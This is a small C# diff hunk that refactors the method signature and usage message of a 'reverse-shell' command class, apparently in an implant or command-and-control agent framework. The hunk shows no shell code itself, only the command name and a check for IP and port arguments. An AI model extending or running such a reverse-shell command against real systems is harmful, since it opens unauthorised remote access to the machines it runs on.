@@ -19,11 +19,11 @@ namespace Commands
         private StreamWriter streamWriter;
 
         public override string Name => "reverse-shell";
-        public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
 			if (task.SplittedArgs.Count() != 2)
 			{
-				result.Result = $"Usage : {this.Name} Ip port";
+				context.Result.Result = $"Usage : {this.Name} Ip port";
 				return;
 			}
 
